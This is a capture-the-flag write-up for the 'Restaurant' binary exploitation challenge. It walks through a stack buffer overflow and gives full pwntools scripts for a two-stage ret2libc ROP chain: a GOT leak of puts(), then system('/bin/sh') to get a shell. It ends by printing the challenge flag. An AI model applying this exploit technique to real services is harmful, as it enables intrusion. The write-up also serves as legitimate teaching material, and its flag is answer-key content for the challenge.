# Restaurant
> Write-up author: vreshco
## DESCRIPTION:
Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just don't overdo it..
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/218115116-506eedf0-2fd5-4456-821b-2e840a5b4910.png)


2. Let's check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/218115265-0417d28f-2401-4961-a53b-0b84149e075c.png)


3. Now we know, the **restaurant** is a 64 bit binary file and it's not stripped, let's check the binary's protections.

> VULN - NO CANARY FOUND, NO PIE.

![image](https://user-images.githubusercontent.com/70703371/218116059-7fc94767-9177-42f5-b2cd-66e4deba8b90.png)


4. Now let's decompile the binary using ghidra.
5. At the `fill()` function, looks like there's a bufferoverflow, not only that we can leak the address of `puts()`.

![image](https://user-images.githubusercontent.com/70703371/218119145-7fe380f3-fbfb-44a0-9c7f-876f5c90b093.png)


6. Let's get the offset of RIP first by get a segmentation fault with running the binary in gdb.
7. Enter 1024 bytes.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/218121772-d33483b6-d7ee-4d9e-90b6-9216d265edc1.png)


8. Since there's no value leaked at the RIP, we can use the RSP offset.

> RESULT - 40

![image](https://user-images.githubusercontent.com/70703371/218122089-5186b81e-be34-4433-8d53-9745341c834d.png)


9. Well, notice that there's no interesting function to jump or flag function, then we given a libc library, hence the approach here is `ROP`.
10. The steps here, first we need to craft a `ROP exploit` so we can leak any library function's address.
11. Find the correct libc library used (in this case we don't need to, because we the library is given).
12. Calculate & set the ASLR base address of libc library used in the server.
13. ROP payload for system call bash.
14. So first, we need to grep our `puts()` address from the plt and the **pop rdi** gadget, we can simply find the `puts()` address using gdb and the **pop rdi** offset using `ropper`.

> USING GDB - 0x400650

![image](https://user-images.githubusercontent.com/70703371/218255402-0b113e76-3672-4cca-98ab-6f03d6cca88c.png)


> USING ROPPER (To get pop rdi) - 0x4010a3

![image](https://user-images.githubusercontent.com/70703371/218255428-7e10147a-25fe-49d6-b6cc-1163373e6db9.png)


15. Anyway we can simplify that using **pwntools**, by executing this one line of script:

```py
rop.call(elf.plt['puts'], [next(elf.search(b''))])
```

> IMPLEMENT IT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
libc_library = './libc.so.6'
elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_library, checksec=False)
context.log_level = 'debug'

sh = start()

offsetRsp = b'A' * 40
rop = ROP(elf) 

rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
```

> OUTPUT - Got all of it correctly

![image](https://user-images.githubusercontent.com/70703371/218255496-cc815fca-1a32-463d-b481-de00220cb73a.png)


16. Next, we need to call the `puts()` again and print the address stored in `got`, using this one line:

```py
rop.call(elf.plt['puts'], [elf.got['puts']])
```

17. Afterwards, we want to align the stack to 16 bytes by adding a dummy gadget that calls/returns to a gadget with only the "ret" instruction.
18. Since it does nothing, so our whole ROP chain exploit shall aligned 16 bytes, it's important so our ROP chain shall executed successfully.

```py
rop_elf.call((rop_elf.find_gadget(["ret"]))[0])
```

19. Now we can go to `fill()` again by call the `fill()` offset.
20. With this we can create the next payload.
21. Then to get the libcASLR address, simply adding the offsetRSP by `rop.chain()`.

> THE SCRIPT SO FAR

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
libc_library = './libc.so.6'
elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_library, checksec=False)
context.log_level = 'debug'

sh = start()

offsetRsp = b'A' * 40
rop = ROP(elf) 

rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call((rop.find_gadget(['ret']))[0]) 
rop.call(elf.sym['fill']) 
ropGetlibcaslr_addr = offsetRsp + rop.chain()
log.info(rop.dump()) 
```

> OUTPUT



> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
libc_library = './libc.so.6'
elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_library, checksec=False)
context.log_level = 'debug'

sh = start()

offsetRsp = b'A' * 40

### 1ST PAYLOAD

rop = ROP(elf) 
rop.call(elf.plt['puts'], [next(elf.search(b''))])

rop.call(elf.plt['puts'], [elf.got['puts']])

# for stack alignment (must align to 16 bytes)
rop.call((rop.find_gadget(['ret']))[0]) 
#print(rop.dump()) # to see the alignment

# goes back to fill(), so we can setup our next ROP
rop.call(elf.sym['fill']) 

# combine into usable payload
ropGetlibcaslr_addr = offsetRsp + rop.chain()
log.info(rop.dump())

sh.sendlineafter(b'>', b'1')
# exploit the vuln to print out the ASLR addr of puts() for libc in the server
sh.sendlineafter(b'>', ropGetlibcaslr_addr) 

# ignore empty space printed to us
sh.recvuntil(b'\n')
# ignore the 1st line statement printed to use as is 
# by the program to tell us "Enjoy your <input value>" before reaching RET
sh.recvuntil(b'\n') 

# get the leaked address of ASLR puts()
leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
info('Server libc, puts() addr: %#x', leakedputsLibc)

serverLibcbase_addr = leakedputsLibc - libc.symbols['puts']
info('Server libc base addr: %#x', serverLibcbase_addr)

libc.address = serverLibcbase_addr

### 2ND PAYLOAD - craft sys call to /bin/sh

ropLibc = ROP(libc)
ropLibc.call((ropLibc.find_gadget(['ret']))[0]) # align stack (16 bytes)
ropLibc.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])

# combine into usable payload
ropGetbash = offsetRsp + ropLibc.chain()
log.info(ropLibc.dump())

### GET SHELL
sh.sendlineafter(b'>', ropGetbash)
sh.interactive()
```

14. Run the script remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/218248357-633b42a1-5501-413e-ac46-7cedf555012d.png)


15. Got the flag!

## FLAG

```
HTB{r3turn_2_th3_r3st4ur4nt!}
```


